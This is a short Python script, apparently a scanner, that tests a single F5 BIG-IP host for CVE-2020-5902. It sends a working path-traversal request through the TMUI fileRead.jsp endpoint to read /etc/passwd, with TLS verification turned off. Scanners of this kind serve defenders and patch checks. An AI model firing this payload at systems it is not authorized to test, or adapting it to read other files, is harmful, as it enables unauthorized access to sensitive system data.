#!/usr/bin/env python3
#
# Check to see if a F5 BIG-IP Server is vulnerable to CVE-2020-5902
# Written by @InfosecShinobi for @NaijaSecForce
#Inspired by @HackingDave's Citrixmash exploit
#
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import argparse
import time
import subprocess
import re

def submit_ip(url):
    with requests.Session() as s:
        r = requests.Request(method='GET', url=url)
        prep = r.prepare()
        prep.url = url
        return s.send(prep, verify=False, timeout=3)

def check_server(target, targetport):
    try:
        print("Scanning for CVE-2020-5902 on: %s        " % target, end="\r")     
        if targetport == "80":
            url = ("http://%s:%s/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" % (target,targetport))
            req = submit_ip(url)

        else:
            url = ("https://%s:%s/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" % (target,targetport))
            req = submit_ip(url)

        # if the system is still vulnerable
        if ("root:x:0:0:root") in str(req.content): # listing /etc/passwd 
            print("[\033[91m!!!\033[0m] This F5 Big-IP Server: %s is vulnerable to cve-2020-5902." % (target))
            vulnServers.append(target)
            return 1

        # if the system responds with a 404, 403 or no response at all.
        
        else:
            print("[-] Server %s does not appear to be vulnerable or perhaps, not a F5 Big-IP Server." % (target))
            

        # handle exception errors due to timeouts
    except requests.ReadTimeout: 
        print("[\033[92m+\033[0m] ReadTimeout: Server %s timed out and didn't respond on port: %s. \n Target does not appear to be vulnerable or perhaps, not a F5 Big-IP Server." % (target, targetport))
        pass 

    except requests.ConnectTimeout:
        print("[\033[92m+\033[0m] ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open. \n Target does not appear to be vulnerable or perhaps, not a F5 Big-IP Server." % (target, targetport))
        pass 

    except requests.ConnectionError:
        print("[\033[92m+\033[0m] ConnectionError: Server %s had a connection error on port (%s). SSL does not appear to be valid. \n Target does not appear to be vulnerable or perhaps, not a F5 Big-IP Server." % (target,targetport))
        pass 

def parse_target_args(target, port):
    
    check_server(target, port)

print("""

   _______      ________    ___   ___ ___   ___         _____ ___   ___ ___  
  / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \       | ____/ _ \ / _ \__ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) | | | |______| |__| (_) | | | | ) |
 | |      \ \/ / |  __|______/ /| | | |/ /| | | |______|___ \\__, | | | |/ / 
 | |____   \  /  | |____    / /_| |_| / /_| |_| |       ___) | / /| |_| / /_ 
  \_____|   \/   |______|  |____|\___/____|\___/       |____/ /_/  \___/____|
                                                                             
                                                                                
CVE-2020-5902-Scanner
Written for @NaijaSecForce by @InfosecShinobi

This is to test if a single remote system is vulnerable to cve-2020-5902. 
Exploit Reference: (@x4ce) - https://twitter.com/x4ce/status/1279790599793545216

How-to: python3 cve-2020-5902_scanner.py 192.168.x.x 443
Usage: python3 cve-2020-5902_scanner.py targetip targetport
""")

vulnServers = []


# parse our commands
parser = argparse.ArgumentParser()
parser.add_argument("target")
parser.add_argument("targetport")
args = parser.parse_args()


try:
    parse_target_args(args.target, args.targetport)

    print("Finished testing %s for cve-2020-5902" % args.target)
   # print("-" * 100)
    #for server in vulnServers:
     #   print(server, "-" * 100, sep="\n")

except KeyboardInterrupt:
    print("[!] interrupt received, stopping..")
    time.sleep(0.1)